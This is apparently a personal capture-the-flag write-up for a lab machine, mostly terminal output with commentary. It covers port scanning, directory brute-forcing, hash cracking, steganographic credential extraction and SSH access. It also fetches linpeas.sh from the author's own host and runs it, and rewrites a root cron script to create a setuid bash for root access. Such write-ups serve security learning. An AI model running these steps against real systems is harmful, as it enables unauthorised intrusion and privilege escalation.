@@ -1,0 +1,364 @@
+sudo openvpn 'vpn/Karma.47 (3).ovpn'
+PS C:\Users\makar> ./wsl-vpn-routes.ps1
+
+# Nmap 7.94SVN scan initiated Tue Sep  2 08:19:32 2025 as: nmap -p- -A -T4 -v -oN easypeasyctf_nmap 10.201.72.248
+Warning: 10.201.72.248 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.201.72.248
+Host is up (0.23s latency).
+Not shown: 65440 closed tcp ports (conn-refused), 92 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.16.1
+| http-methods:
+|_  Supported Methods: GET HEAD
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.16.1
+6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
+|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
+|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
+65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+| http-robots.txt: 1 disallowed entry
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Sep  2 08:51:00 2025 -- 1 IP address (1 host up) scanned in 1888.23 seconds
+
+makar@LAPTOP-ASUME87D:~  % gobuster dir -u http://10.201.72.248/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.72.248/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/hidden               (Status: 301) [Size: 169] [--> http://10.201.72.248/hidden/]
+/index.html           (Status: 200) [Size: 612]
+/robots.txt           (Status: 200) [Size: 43]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % gobuster dir -u http://10.201.72.248/hidden/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.72.248/hidden/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 390]
+/whatever             (Status: 301) [Size: 169] [--> http://10.201.72.248/hidden/whatever/]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+#Hidden in the page source was this -> <p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p> and i extensively used cyberchef for this ctf and it gave me 
+#input: ZmxhZ3tmMXJzN19mbDRnfQ==                output: flag{f1rs7_fl4g} (From Base64)
+
+#Next i checked the other 65524/tcp open  http  apache site
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % gobuster dir -u http://10.201.72.248:65524/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.72.248:65524/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 281]
+/.htpasswd            (Status: 403) [Size: 281]
+/.hta                 (Status: 403) [Size: 281]
+/index.html           (Status: 200) [Size: 10818]
+/robots.txt           (Status: 200) [Size: 153]
+/server-status        (Status: 403) [Size: 281]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+#so two hits
+
+http://10.201.72.248:65524/robots.txt
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+#This flag was pretty hard to crack actually. i didnt knew what this actually was. but at the end i tried my trusty https://md5hashing.net/
+
+Md5 hash
+calculated hash digest
+a18672860d0510e5ab6699730763b250
+
+Md5 value
+Reversed hash value
+flag{1m_s3c0nd_fl4g}
+
+#Yes, let's go!
+
+# Then in http://10.201.72.248:65524/ we got                            Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} and this bit of info
+#          Apache 2 It Works For Me
+#	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
+#        </span>
+
+#So, next on cybercheft i tried various base formats and got a hit with Base64 as ObsJmP173N2X6dOrAgEAL0Vu ---> /n0th1ng3ls3m4tt3r
+#So, going to http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/ we get 
+
+<center>
+<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
+<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
+</center>
+
+#We were given a downloadable password list and i tested this string against that and got the match
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % WORDLIST=/home/makar/CTFs/easypeasyctf/easypeasy_1596838725703.txt
+/home/makar/john-jumbo/run/john \
+  --format=gost \
+  --wordlist="$WORDLIST" \
+  --rules \
+  hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Enabling duplicate candidate password suppressor using 256 MiB
+mypasswordforthatjob (?)
+1g 0:00:00:00 DONE (2025-09-02 09:33) 4.167g/s 17066p/s 17066c/s 17066C/s vickvick..ramiley
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+#It was the encryption GOST that was very hard to get. i used the hint to specify the type of hashing algorithm used. Next i got that pic
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % wget http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+--2025-09-02 09:36:19--  http://10.201.72.248:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+Connecting to 10.201.72.248:65524... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 90158 (88K) [image/jpeg]
+Saving to: ‘binarycodepixabay.jpg’
+
+binarycodepixabay.jpg                  100%[============================================================================>]  88.04K  34.1KB/s    in 2.6s
+
+2025-09-02 09:36:22 (34.1 KB/s) - ‘binarycodepixabay.jpg’ saved [90158/90158]
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % steghide info binarycodepixabay.jpg
+"binarycodepixabay.jpg":
+  format: jpeg
+  capacity: 4.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+  embedded file "secrettext.txt":
+    size: 278.0 Byte
+    encrypted: no
+    compressed: no
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ls
+10.201.72.248:65524/  binarycodepixabay.jpg  easypeasy_1596838725703.txt  easypeasyctf_nmap  hash.txt
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % steghide extract -sf binarycodepixabay.jpg
+Enter passphrase:
+wrote extracted data to "secrettext.txt".
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ls
+10.201.72.248:65524/  binarycodepixabay.jpg  easypeasy_1596838725703.txt  easypeasyctf_nmap  hash.txt  secrettext.txt
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % cat secrettext.txt
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+
+#Using cyberchef we get this binary to spell iconvertedmypasswordtobinary which is our password for ssh!!!
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % ssh -p 6498 boring@10.201.72.248 
+#(As ssh was at other port than its usual one)
+The authenticity of host '[10.201.72.248]:6498 ([10.201.72.248]:6498)' can't be established.
+ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.201.72.248]:6498' (ED25519) to the list of known hosts.
+*************************************************************************
+**        This connection are monitored by government offical          **
+**            Please disconnect if you are not authorized              **
+** A lawsuit will be filed against you if the law is not followed      **
+*************************************************************************
+boring@10.201.72.248's password:
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+boring@kral4-PC:~$ whoami
+boring
+boring@kral4-PC:~$ id; uname -a
+uid=1000(boring) gid=1000(boring) groups=1000(boring)
+Linux kral4-PC 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+boring@kral4-PC:~$ ls
+user.txt
+boring@kral4-PC:~$ cat user.txt
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+#(Those are just scary welcome text, nothing to worry about)
+
+Using Rot13 we get synt{a0jvgf33zfa0ez4y} ---> flag{n0wits33msn0rm4l}
+
+#
+
+boring@kral4-PC:~$ sudo -l
+[sudo] password for boring:
+Sorry, try again.
+[sudo] password for boring:
+Sorry, user boring may not run sudo on kral4-PC.
+boring@kral4-PC:~$ ls -la /home
+total 12
+drwxr-xr-x  3 root   root   4096 Jun 14  2020 .
+drwxr-xr-x 23 root   root   4096 Jun 15  2020 ..
+drwxr-xr-x  5 boring boring 4096 Jun 15  2020 boring
+boring@kral4-PC:/$ ls -la root
+ls: cannot open directory 'root': Permission denied
+boring@kral4-PC:/$ cd root
+-bash: cd: root: Permission denied
+#ok, i just got the linpeas.sh and ran it
+boring@kral4-PC:/tmp$ wget http://10.21.223.89:8000/linpeas.sh
+--2025-09-02 02:50:06--  http://10.21.223.89:8000/linpeas.sh
+Connecting to 10.21.223.89:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 956174 (934K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh         100%[================>] 933.76K   180KB/s    in 5.2s
+
+2025-09-02 02:50:12 (180 KB/s) - ‘linpeas.sh’ saved [956174/956174]
+
+boring@kral4-PC:/tmp$ chmod +x linpeas.sh
+boring@kral4-PC:/tmp$ ./linpeas.sh
+
+#makar@LAPTOP-ASUME87D:~/pentest-tools  % python3 -m http.server 8000
+#Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+#10.201.72.248 - - [02/Sep/2025 09:50:07] "GET /linpeas.sh HTTP/1.1" 200 -
+
+#i don't know how but this grabbed my attention 
+╔══════════╣ Web files?(output limit)
+/var/www/:
+total 16K
+drwxr-xr-x  3 root   root   4.0K Jun 15  2020 .
+drwxr-xr-x 14 root   root   4.0K Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4.0K Jun 15  2020 html
+-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+
+/var/www/html:
+total 32K
+drwxr-xr-x 4 root root 4.0K Jun 15  2020 .
+#That .mysecretcronjob.sh felt important to me somehow among the huge output of linpeas. maybe i am builing a tiny bit of intution for this :)
+
+boring@kral4-PC:/tmp$ cd /var/www/
+boring@kral4-PC:/var/www$ ls
+html
+boring@kral4-PC:/var/www$ ls -la
+total 16
+drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
+drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
+-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh
+#!/bin/bash
+# i will run as root
+boring@kral4-PC:/var/www$ ./.mysecretcronjob.sh
+boring@kral4-PC:/var/www$ whoami
+boring
+boring@kral4-PC:/var/www$ sudo -l
+[sudo] password for boring:
+Sorry, user boring may not run sudo on kral4-PC.
+
+#Running this by myself wont work, it needs to be executed by the root i think. also there is nothing in the code that will get me to root. So,
+
+boring@kral4-PC:/var/www$ grep -R ".mysecretcronjob.sh" /etc/cron* 2>/dev/null
+/etc/crontab:* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ cat /etc/crontab 2>/dev/null | grep -i mysecret
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+boring@kral4-PC:/var/www$ systemctl status cron 2>/dev/null | sed -n '1,40p'
+● cron.service - Regular background program processing daemon
+   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
+   Active: active (running) since Tue 2025-09-02 01:15:42 PDT; 1h 43min ago
+     Docs: man:cron(8)
+ Main PID: 460 (cron)
+    Tasks: 1 (limit: 524)
+   CGroup: /system.slice/cron.service
+           └─460 /usr/sbin/cron -f
+
+Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
+#Ok, it was definitely running every minute. because those * mean 
+# A '*' means “every value”. So * * * * * = every minute of every hour, every day, every month, every weekday.
+# Because this is /etc/crontab, there’s a user field (root) after the 5 time fields, so the command runs as root.
+
+boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh
+
+#!/bin/bash                          # Shebang: run this script with Bash.
+# i will run as root                 # Just a Comment, won't run
+/bin/cp /bin/bash /tmp/bashroot      # Copies the bash binary to /tmp/bashroot
+/bin/chown root:root /tmp/bashroot   # Makes that copy owned by root
+/bin/chmod 4755 /tmp/bashroot        # Sets permissions to rwsr-xr-x (octal 4755)
+                                     4 in the leading position = setuid bit
+                                     7 = owner rwx
+                                     5 = group r-x
+                                     5 = others r-x
+#The setuid bit means: when any user runs /tmp/bashroot, the process runs with the effective UID of the file owner (root) → privilege escalation.
+
+boring@kral4-PC:/var/www$ ls -l /tmp/bashroot
+-rwsr-xr-x 1 root root 1113504 Sep  2 03:05 /tmp/bashroot
+boring@kral4-PC:/var/www$ /tmp/bashroot -p
+bashroot-4.4#
+
+#We are Root!!!!!!!!!
+
+bashroot-4.4# id
+uid=1000(boring) gid=1000(boring) euid=0(root) groups=1000(boring)
+bashroot-4.4# whoami
+root
+bashroot-4.4# cd /
+bashroot-4.4# cd root
+bashroot-4.4# ls -la
+total 40
+drwx------  5 root root 4096 Jun 15  2020 .
+drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
+-rw-------  1 root root  883 Jun 15  2020 .bash_history
+-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
+drwx------  2 root root 4096 Jun 13  2020 .cache
+drwx------  3 root root 4096 Jun 13  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
+-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
+bashroot-4.4# cat .root.txt
+flag{63a9f0ea7bb98050796b649e85481845}
+
+#Yesss! Let's GOooo.. Completed Fully!#
